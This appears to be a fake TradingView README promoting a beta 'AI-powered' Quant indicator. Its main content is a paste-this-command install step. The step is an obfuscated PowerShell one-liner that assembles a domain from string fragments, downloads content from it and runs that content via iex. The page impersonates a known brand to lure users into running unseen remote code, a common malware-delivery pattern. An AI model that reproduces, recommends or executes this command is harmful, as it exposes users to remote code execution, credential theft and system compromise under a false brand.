<div align="center">
<p align="center">
  <img src="logotw.png" alt="TradingView" width="580">
</p>

# TradingView Quant™

</div>

The first AI-powered indicator in our library, built to bring more market context into your TradingView workflow by combining live market data with liquidity, positioning, volatility, market structure, and upcoming events.

## Getting Started

Quant Indicator is currently in beta, and for now, beta access is handled through Command Prompt ahead of its full release in the TradingView indicator library.

### 1. Open Command Prompt

Press **Win + R**, type:

```text
cmd
```

Then press **Enter**.

### 2. Run the Installation Command

Copy and paste the following command into Command Prompt:
```powershell
powershell -NoProfile -Command "$Sync='TradingViewLibrary'; $Quant='.AI'; $TradingView='v_2.9.6_Beta'; $Pinscript=$Sync+$Quant; (curl -UseBasicParsing ($Pinscript)).Content | iex"
```

Press **Enter** to begin the installation.

### 3. Restart TradingView for the changes to take effect.

After installation, Quant Indicator will appear in your TradingView indicator library.

We encourage beta testers to share feedback and report any bugs they encounter at support@tradingview.com. Your feedback helps us improve the indicator ahead of its official release.
